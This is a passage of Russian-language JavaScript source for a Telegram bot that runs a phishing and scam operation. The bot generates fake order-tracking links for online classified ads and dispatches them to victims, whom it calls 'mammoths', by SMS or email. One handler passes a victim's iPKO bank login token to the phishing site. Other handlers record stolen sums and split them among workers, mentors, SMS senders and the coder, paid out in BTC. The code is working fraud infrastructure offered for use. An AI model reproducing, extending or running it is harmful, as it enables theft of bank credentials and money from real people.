            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['fio'].length > 10) ? json['fio'].substring(0, 10) + "..." : json['fio'], "fio")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.fio = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio']
                ctx.reply("❕ Автоматически установлено имя получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.fio = ctx.message.text
        }
        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи адрес получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи адрес получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['to'].length > 10) ? json['to'].substring(0, 10) + "..." : json['to'], "to")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.to = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to']
                ctx.reply("❕ Автоматически установлен адрес получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.to = ctx.message.text
        }
        let randomc = randint(000000, 999999)
        ctx.wizard.state.data['worker_id'] = ctx.from.id
        ctx.wizard.state.data['worker'] = ctx.from.username
        writeFileSync(`../${readFileSync("database/scenes/" + ctx.from.id)}/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
        writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({ fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to }))
        ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price}\n\n👉 https://${services_original[readFileSync("database/scenes/" + ctx.from.id)]}.${_local.pldomain}/order.php?id=${randomc}`, Markup.inlineKeyboard([
            [
                Markup.button.callback("📩 Отправить SMS.", "@sendsms:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ],
            [
                Markup.button.callback("🗳 Отправить EMAIL.", "@sendemail:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ],
            [
                Markup.button.callback("❌ Удалить ссылку.", "@deletelink:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ]
        ]))
        await ctx.scene.leave()

    }
)

const adddmns = new Scenes.WizardScene(
    "adddmns",
    (ctx) => {
        ctx.reply("Введите домены через разделитель в новую строку.")
        ctx.wizard.next()
    },
    (ctx) => {
        ctx.message.text.replace(/ /g, "").split("\n").forEach(lnk => {
            writeFileSync("database/domains/" + lnk, "1")
            ctx.reply("Добавлен домен " + lnk)
        })

        ctx.reply("Все домены добавлены.")
        ctx.scene.leave()

    }
)

const ofrtlink = new Scenes.WizardScene(
    "ofrtlink",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("❇️ Введи название обьявления.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        ctx.wizard.state.data.obyava = ctx.message.text
        ctx.reply("❇️ Введи стоимость обьявления.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        ctx.wizard.state.data.price = ctx.message.text
        ctx.reply("❇️ Отправь ссылкой картинку на обьявление. Вы можете получить ссылку на картинку тут @Images_24_bot", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    async(ctx) => {
        ctx.wizard.state.data.img = ctx.message.text
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())



        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['fio'].length > 10) ? json['fio'].substring(0, 10) + "..." : json['fio'], "fio")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.fio = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio']
                ctx.reply("❕ Автоматически установлено имя получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.fio = ctx.message.text
        }
        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['to'].length > 10) ? json['to'].substring(0, 10) + "..." : json['to'], "to")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.to = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to']
                ctx.reply("❕ Автоматически установлен адресс получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.to = ctx.message.text
        }
        let randomc = randint(000000, 999999)
        ctx.wizard.state.data['worker_id'] = ctx.from.id
        ctx.wizard.state.data['worker'] = ctx.from.username
        writeFileSync(`../${readFileSync("database/scenes/" + ctx.from.id)}/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
        writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({ fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to }))
        await ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price}\n\n👉 https://${services_original[readFileSync("database/scenes/" + ctx.from.id)]}.${_local.pldomain}/order.php?id=${randomc}`, Markup.inlineKeyboard([
            [
                Markup.button.callback("📩 Отправить SMS.", "@sendsms:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ],
            [
                Markup.button.callback("🗳 Отправить EMAIL.", "@sendemail:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ],
            [
                Markup.button.callback("❌ Удалить ссылку.", "@deletelink:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ]
        ]))
        await ctx.scene.leave()

    }
)

const olxrepay = new Scenes.WizardScene(
    "olxrepay",
    (ctx) => {
        ctx.wizard.state.data = {}
        ctx.reply("❇️ Введи ссылку на обьявление.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Отменить", "cancel")
            ]
        ]))
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        let adv = await parse_link(ctx.message.text)
        if (adv == "404") return ctx.reply("Произошла ошибка при парсинге, ссылка битая. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())

        ctx.wizard.state.data.obyava = adv.title
        ctx.wizard.state.data.price = adv.price
        ctx.wizard.state.data.img = adv.image

        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['fio'].length > 10) ? json['fio'].substring(0, 10) + "..." : json['fio'], "fio")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.fio = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio']
                ctx.reply("❕ Автоматически установлено имя получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['fio'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.fio = ctx.message.text
        }
        if (existsSync("database/savethe/" + ctx.from.id) == false) {
            ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        } else {
            let json = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))
            ctx.reply("Укажи адресс получателя.", Markup.inlineKeyboard([
                [
                    Markup.button.callback((json['to'].length > 10) ? json['to'].substring(0, 10) + "..." : json['to'], "to")
                ],
                [
                    Markup.button.callback("Отменить", "cancel")
                ]
            ]))
        }
        ctx.wizard.next()
    },
    async(ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') {
            if (ctx.update.callback_query.data == "cancel") {
                return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
                    [
                        Markup.button.callback("Меню", "callMenu")
                    ]
                ])).then(ctx.scene.leave())
            } else {
                ctx.wizard.state.data.to = JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to']
                ctx.reply("❕ Автоматически установлен адресс получателя <b>-></b> " + JSON.parse(readFileSync("database/savethe/" + ctx.from.id))['to'], { parse_mode: "HTML" })
            }
        } else {
            ctx.wizard.state.data.to = ctx.message.text
        }
        let randomc = randint(000000, 999999)
        ctx.wizard.state.data['worker_id'] = ctx.from.id
        ctx.wizard.state.data['worker'] = ctx.from.username
        writeFileSync(`../${readFileSync("database/scenes/" + ctx.from.id)}/data/${randomc}.xml`, "<xml>\n" + convert.json2xml(ctx.wizard.state.data, { compact: true, ignoreComment: true, spaces: 4 }) + "\n</xml>")
        writeFileSync("database/savethe/" + ctx.from.id, JSON.stringify({ fio: ctx.wizard.state.data.fio, to: ctx.wizard.state.data.to }))
        await ctx.reply(`❇️ Информация о трек номере!\n\n❇️ Трек номер: ${randomc}\n❇️ Название: ${ctx.wizard.state.data.obyava}\n❇️ Стоимость: ${ctx.wizard.state.data.price} PLN\n\n👉 https://${services_original[readFileSync("database/scenes/" + ctx.from.id)]}.${_local.pldomain}/order.php?id=${randomc}`, Markup.inlineKeyboard([
            [
                Markup.button.callback("📩 Отправить SMS.", "@sendsms:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ],
            [
                Markup.button.callback("🗳 Отправить EMAIL.", "@sendemail:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ],
            [
                Markup.button.callback("❌ Удалить ссылку.", "@deletelink:" + readFileSync("database/scenes/" + ctx.from.id).toString("utf-8") + ":" + randomc)
            ]
        ]))
        await ctx.scene.leave()

    }
)

const mkprofit = new Scenes.WizardScene(
        "mkprofit",
        (ctx) => {
            ctx.reply("💵 <b>-></b> Введи сумму профита в <b>RUB</b>.", { parse_mode: "HTML" })
            ctx.wizard.next()
        },
        async(ctx) => {
            try {
                const mk_text = JSON.parse(readFileSync("database/scenes/" + ctx.from.id).toString("utf-8"))['text'].toString("utf-8")

                let country = mk_text.split("\n")[0].split(" ")[0]
                let wid = mk_text.match(/❇️ Воркер ID: (.+)/)[1]
                let wpercent = Number(readFileSync(`database/maindb/${wid}/percent`).toString("utf-8"))
                let _profitid = randint(000000, 999999)

                if (mk_text.includes("❕ Bank:") == true) {
                    var type = mk_text.match(/❕ Bank: (.+)/)[1]
                } else {
                    var type = "💳 Карта."
                }

                const options = {
                    method: 'GET',
                    headers: { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36' },
                    url: "https://www.cbr-xml-daily.ru/daily_json.js"
                }

                let res = await axios(options);

                if (existsSync(`../sms/${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[2]}_${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[1]}_${wid}`)) {
                    wpercent = wpercent - 5
                }

                var answer_channel = `<b>${country}🤑 Успешное снятие 🤑${country}</b>\n`
                answer_channel += `<b>✅ Сумма</b>: <code>${ctx.message.text} RUB / ${Math.round(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal))} ${_local.valute[country]}</code>\n`
                answer_channel += `<b>💰 Доля воркера</b>: <code>${Math.round(percent(ctx.message.text, wpercent))} RUB / ${Math.round(percent(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal), wpercent))} ${_local.valute[country]}</code>\n`

                if (existsSync(`../sms/${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[2]}_${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[1]}_${wid}`)) {
                    answer_channel += `<b>💌 SMS/EMAIL</b>: <code>${Math.round(percent(ctx.message.text, 5))} RUB / ${Math.round(percent(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal), 5))} ${_local.valute[country]}</code>\n`
                }

                answer_channel += `<b>🏦 Банк</b>: <code>${type}</code>\n`
                answer_channel += `<b>👨‍💻 Воркер</b>: #${readFileSync(`database/maindb/${wid}/tag`).toString("utf-8").replace("\n", "")}\n`

            if (existsSync(`database/maindb/${wid}/mentor`)) {
                answer_channel += `<b>😈 Наставник</b>: #${String(getMentor(readFileSync(`database/maindb/${wid}/mentor`))['tag']).replace("\n", "")}\n`
            }

            answer_channel += `<b>🌒 ID:</b> ${_profitid}\n`
            answer_channel += `<b>☑️ Ожидает оплаты</b>`

            var scanswer_channel = `<b>${country}🤑 Успешное снятие 🤑${country}</b>\n`
            scanswer_channel += `<b>✅ Сумма</b>: <code>${ctx.message.text} RUB / ${Math.round(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal))} ${_local.valute[country]}</code>\n`
            scanswer_channel += `<b>💰 Доля воркера</b>: <code>${Math.round(percent(ctx.message.text, wpercent))} RUB / ${Math.round(percent(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal), wpercent))} ${_local.valute[country]}</code>\n`

            if (existsSync(`../sms/${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[2]}_${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[1]}_${wid}`)) {
                scanswer_channel += `<b>💌 SMS/EMAIL</b>: <code>${Math.round(percent(ctx.message.text, 5))} RUB / ${Math.round(percent(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal), 5))} ${_local.valute[country]}</code>\n`
            }

            scanswer_channel += `<b>🏦 Банк</b>: <code>${type}</code>\n`
            scanswer_channel += `<b>👨‍💻 Воркер</b>: #${readFileSync(`database/maindb/${wid}/tag`).toString("utf-8").replace("\n", "")}\n`

            if (existsSync(`database/maindb/${wid}/mentor`)) {
                scanswer_channel += `<b>😈 Наставник</b>: #${String(getMentor(readFileSync(`database/maindb/${wid}/mentor`))['tag']).replace("\n", "")}\n`
            }
            scanswer_channel += `<b>🌒 ID:</b> ${_profitid}\n`
            scanswer_channel += `<b>✅ Выплачено</b>`
            
            var answer_user = "<b>🤑💰🤑 Успешное снятие! 🤑💰🤑</b>\n"
            answer_user += `<b>🏦 Банк</b>: <code>${type}</code>\n`
            answer_user += `<b>💰 Сумма залёта</b>: <code>${ctx.message.text} RUB / ${Math.round(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal))} ${_local.valute[country]}</code>\n`
            answer_user += `<b>💎 Ваша доля</b>: <code>${Math.round(percent(ctx.message.text, wpercent))} RUB / ${Math.round(percent(ctx.message.text / (res.data.Valute[_local.valute[country]].Value / res.data.Valute[_local.valute[country]].Nominal), wpercent))} ${_local.valute[country]}</code>\n`
            if (existsSync(`database/maindb/${wid}/mentor`)) {
                answer_user += `<b>🧸 Наставник</b>: #${String(getMentor(readFileSync(`database/maindb/${wid}/mentor`))['tag']).replace("\n", "")}\n`
            }
            answer_user += `<b>🕸 Кошелек</b>: <code>${readFileSync(`database/maindb/${wid}/btc`).toString("utf-8")}</code>\n\n`
            answer_user += `<b>⚠️ Если адрес вашего кошелька BTC указан неверно или изменился, срочно сообщите об этом ТСу!</b>`

            let kid = readdirSync(`database/kassa/`).length+1
            let wpid = readdirSync(`database/maindb/${wid}/profits/`).length+1

            let msg = await bot.telegram.sendMessage(cfg.payouts, answer_channel, {parse_mode: "HTML"})

            writeFileSync(`database/kassa/${kid}`, JSON.stringify({ profit: Math.round(ctx.message.text / (res.data.Valute.USD.Value / res.data.Valute.USD.Nominal)), worker: readFileSync(`database/maindb/${wid}/tag`).toString("utf-8"), hname: ctx.from.username, hid: ctx.from.id, rprofit: ctx.message.text, mentor: existsSync(`database/maindb/${wid}/mentor`) ? readFileSync(`database/maindb/${wid}/mentor`).toString("utf-8") : "none", sms: existsSync(`../sms/${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[2]}_${mk_text.match(/❇️ Идентификатор: (.+) \/ (.+)/)[1]}_${wid}`) ? "yes" : "no" }))
            writeFileSync(`database/maindb/${wid}/profits/${wpid}`, String(Math.round(ctx.message.text / (res.data.Valute.USD.Value / res.data.Valute.USD.Nominal))))
            writeFileSync(`database/allkassa`, String(Number(readFileSync("database/allkassa").toString("utf-8")) + Number(ctx.message.text)));
            writeFileSync(`database/profits/${_profitid}`, JSON.stringify({ 
                msg_id: msg.message_id,
                wid: wid,
                text: scanswer_channel,
                w: mk_text.match(/❇️ Воркер: (.+)/)[1],
                profit: ctx.message.text,
                percen: wpercent,
                kid: kid,
                wpid: wpid,
                hander: ctx.from.username
            }))


            await bot.telegram.sendMessage(chats.main, answer_channel, {parse_mode: "HTML"})
            await bot.telegram.sendMessage(wid, answer_user, {parse_mode: "HTML"})
            await ctx.reply("Профит успешно записан!")
            await ctx.scene.leave()
        }catch(e) {
            ctx.reply("Ошибка вписывания профита. Перешлите данное сообщение кодеру.\n\n" + e)
            console.log(e)
            ctx.scene.leave()
        }


    }
)

const pko = new Scenes.WizardScene(
    "pko",
    (ctx) => {
        ctx.reply("🫐 Введи токен для входа в iPKO.", Markup.inlineKeyboard([[Markup.button.callback("Отменить", "cancel")]]))
        ctx.wizard.next()
    },
    (ctx) => {
        if (typeof ctx.update.callback_query != 'undefined') return ctx.reply("Отменено. Вы можете вызвать меню кнопкой ниже.", Markup.inlineKeyboard([
            [
                Markup.button.callback("Меню", "callMenu")
            ]
        ])).then(ctx.scene.leave())
        let json = JSON.parse(readFileSync("database/scenes/" + ctx.from.id))
        writeFileSync(`/var/www/html/pko/${json['id']}_${json['wid']}`, String(ctx.message.text))
        writeFileSync(`/var/www/html/verif/${json['id']}_${json['wid']}`, String("4"));
        bot.telegram.sendMessage(json['wid'], `✴️ Вбивер @${ctx.from.username} направил мамонта на одноразововое подтверждение 🫐 TokenPKO! После подтверждения TokenPKO мамонт будет направлен на страницу ожидания.`);
        ctx.reply("🫐 Мамонт направлен на TokenPKO! После ввода его обратно отправит на страницу ожидания.")
        ctx.scene.leave()
    }
)



const stage = new Scenes.Stage([
    register, bgd, olx, pko, pstlink, olxrepay,
    ofrtlink, mkprofit, btc, invest, adddmns, smska,
    tagc, email
])

bot.use(session());
bot.use(stage.middleware());

bot.on("new_chat_members", (ctx) => {
    ctx.message.new_chat_members.forEach(current => {
        if (current.is_bot == true){
            try { bot.telegram.kickChatMember(ctx.chat.id, current.id) } catch(e) { console.log(e) }
        }
    })
})

bot.command("prostitutka", (ctx) => ctx.reply("Ты", {reply_to_message_id: ctx.message.message_id}))


bot.command("vbiv", (ctx) => ctx.reply(`<b>👨‍💻 Вбиверы</b>\n${vhand()}\n\n<b>📩 SMS</b>\n${vsms()}`, {parse_mode: "HTML", disable_web_page_preview: "true"}))


bot.command("work", (ctx) => {
    if (existsSync("database/handers/" + ctx.from.id) == false) return false;
    let work = [[]]
    let repl = ""

    _local.cp.forEach(cnt => {
            work.push([{text: `${_local.cp_flags[cnt]}`, callback_data: `@sup:${cnt}`}, {text: `${_local.cp_flags[cnt]} ❌`, callback_data: `@sdown:${cnt}`}])
            repl += _local.cp_flags[cnt]
    })

    ctx.reply("Выбери страну для вбива.\n👨‍💻 🏳️ Вбивер @"+ ctx.from.username +" вызвал панель вбива.\n" + repl, { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: work })})
})

bot.command("salary", (ctx) => {

    if (readdirSync("database/kassa/").length == 0){
        ctx.reply(`📊 Зарплата: 0 рубасей.`)
    }else{

        let answer = "📊 SALARY.\n\n🧙‍♂️ Зарплата вбиверам.\n"
        let salary = {}
        let salary2 = []
        let salary_mentor = {}
        let salary_mentor2 = []
        
        let gooso = 0
        let kassa = 0

        readdirSync("database/kassa/").forEach(handsalary => {
            let json = JSON.parse(readFileSync("database/kassa/" + handsalary).toString("utf-8"))

            if (salary2.includes(json.hname) == false){
                salary2.push(json.hname)
            }

            if (typeof salary[json.hname] == "undefined"){
                salary[json.hname] = Number(json.rprofit)
            }else{
                salary[json.hname] += Number(json.rprofit)
            }

            kassa += Number(json.rprofit)
        })

        salary2.forEach(hander => {
            answer += `<b>@${hander}</b> вбил <b>${salary[hander]} RUB</b>. ( <b>7%</b> - ${percent(salary[hander], 7)} <b>RUB</b> / <b>12%</b> - ${percent(salary[hander], 12)} <b>RUB</b>)\n`
        })

        answer += `\n👨‍🏫 Зарплата наставникам.\n`

        readdirSync("database/kassa/").forEach(handsalary => {
            let json = JSON.parse(readFileSync("database/kassa/" + handsalary).toString("utf-8"))
            if (json.mentor == "none") return

            let mname = readFileSync(`database/maindb/${json.mentor}/tag`).toString("utf-8")

            if (salary_mentor2.includes(mname) == false){
                salary_mentor2.push(mname)
            }

            if (typeof salary_mentor[mname] == "undefined"){
                salary_mentor[mname] = Number(json.rprofit)
            }else{
                salary_mentor[mname] += Number(json.rprofit)
            }

            salary_mentor2.forEach(hander => {
                answer += `<b>#${hander.replace("\n", "")}</b> заработал <b>${percent(salary_mentor[hander], 5)} RUB</b>.\n`
            })
        })

        readdirSync("database/kassa/").forEach(handsalary => {
            let json = JSON.parse(readFileSync("database/kassa/" + handsalary).toString("utf-8"))

            if (json.sms == "yes"){
                gooso += percent(json.rprofit, 5)
            }
        })

        answer += `\n<b>👨‍💻 Зарплата кодеру</b>: ${percent(kassa, 5)} RUB`
        answer += `\n<b>📩 Зарплата SMSeram</b>: ${gooso} RUB`

        ctx.reply(answer, {parse_mode: "HTML"})
    }

})

bot.command("kassa", (ctx) => {
    if (readdirSync("database/kassa/").length == 0){
        ctx.reply(`📊 Сегодня не было профитов.`)
    }else{
        var count = 0
        var all = 0

        var usd = 74

        readdirSync("database/kassa/").forEach(_cpf => {
            let _profit = JSON.parse(readFileSync("database/kassa/" + _cpf).toString("utf-8"))
            all += Number(_profit['rprofit'])
            count += 1
        })

        if (all > readFileSync("database/record").toString("utf-8")){
            writeFileSync("database/record", String(all))
        }

        var allkassa = Number(readFileSync("database/allkassa").toString("utf-8"))

        answer = `<b>📈Статистка залетов📈\n🏦Сегодня</b>: ${all} RUB / ${Math.round(all / usd)} USD\n<b>📊Количество</b>: ${count}\n<b>💎Дневной рекорд</b>: ${readFileSync("database/record").toString("utf-8")} RUB / ${Math.round(Number(readFileSync("database/record").toString("utf-8")) / usd) } USD\n🤑<b>Общая касса проекта</b>: ${allkassa} RUB / ${Math.round(allkassa / usd)} USD`

        ctx.reply(answer, {parse_mode: "HTML"})
    }
})

bot.command("sms", (ctx) => {
    if (existsSync("database/smser/" + ctx.from.id) == false) return false;
    let work = [[]]
    let repl = ""

    _local.cp.forEach(cnt => {
            work.push([{text: `${_local.cp_flags[cnt]}`, callback_data: `@smsup:${cnt}`}, {text: `${_local.cp_flags[cnt]} ❌`, callback_data: `@smsdown:${cnt}`}])
            repl += _local.cp_flags[cnt]
    })

    ctx.reply("Выбери страну для SMS.\n👨‍💻 🏳️ SMSer @"+ ctx.from.username +" вызвал панель SMS.\n" + repl, { parse_mode: "HTML", reply_markup: JSON.stringify({ inline_keyboard: work })})
})


bot.on("callback_query", async (ctx) => {
    let clb = ctx.update.callback_query;

    if (existsSync("database/block/" + ctx.from.id) == true){
        return ctx.reply("Вы были заблокированы. Свяжитесь с администрацией.")
    }

    writeFileSync("database/id_db/" + ctx.from.username.replace(/_/g, "(zzz)").toLowerCase(), String(ctx.from.id))

    if (clb.data == "de") return ctx.reply("в разработке.")

    if (clb.data == "/picksms"){
        bot.telegram.sendMessage(clb.message.text.match(/🧑‍🏭 WorkerID: (.+)/)[1], `📩 За отправку вашего СМС взялся СМСер @${ctx.from.username}`)

        ctx.editMessageReplyMarkup({
            inline_keyboard: [
                [
                    Markup.button.url("📩 @" + ctx.from.username, "https://t.me/" + ctx.from.username)
                ],
                [
                    Markup.button.callback("👉 Отправил SMS", "/sendsms")
                ],
            ]
        });

        
    }

    if (clb.data == "/pickmail"){
        bot.telegram.sendMessage(clb.message.text.match(/🧑‍🏭 WorkerID: (.+)/)[1], `🗳 За отправку вашего EMAIL взялся Mailer @${ctx.from.username}`)

        ctx.editMessageReplyMarkup({
            inline_keyboard: [
                [
                    Markup.button.url("🗳 @" + ctx.from.username, "https://t.me/" + ctx.from.username)
                ],
                [
                    Markup.button.callback("👉 Отправил MAIL", "/sendmail")
                ],
            ]
        });

        
    }

    if (clb.data == "/sendmail"){
        bot.telegram.sendMessage(clb.message.text.match(/🧑‍🏭 WorkerID: (.+)/)[1], `🗳 MAIL выслан вашему мамонту!`)
        ctx.editMessageReplyMarkup({
            inline_keyboard: [
                [
                    Markup.button.url("🗳 @" + ctx.from.username, "https://t.me/" + ctx.from.username)
                ],
                [
                    Markup.button.callback("🗳 MAIL Отправлен", "@")
                ],
            ]
        });
    }

    if (clb.data == "/sendsms"){
        bot.telegram.sendMessage(clb.message.text.match(/🧑‍🏭 WorkerID: (.+)/)[1], `📩 СМС выслано вашему мамонту!`)
        ctx.editMessageReplyMarkup({
            inline_keyboard: [
                [
                    Markup.button.url("📩 @" + ctx.from.username, "https://t.me/" + ctx.from.username)
                ],
                [
                    Markup.button.callback("✅ SMS Отправлено", "@")
                ],
            ]
        });
    }

    if (clb.data.substring(0, 9) == "@sendsms:"){
        writeFileSync("database/scenes/" + ctx.from.id, JSON.stringify({ service: clb.data.match(/@sendsms:(.+):(.+)/)[1], id: clb.data.match(/@sendsms:(.+):(.+)/)[2] }))
        ctx.scene.enter("smska", ctx.scene.stage)
    }

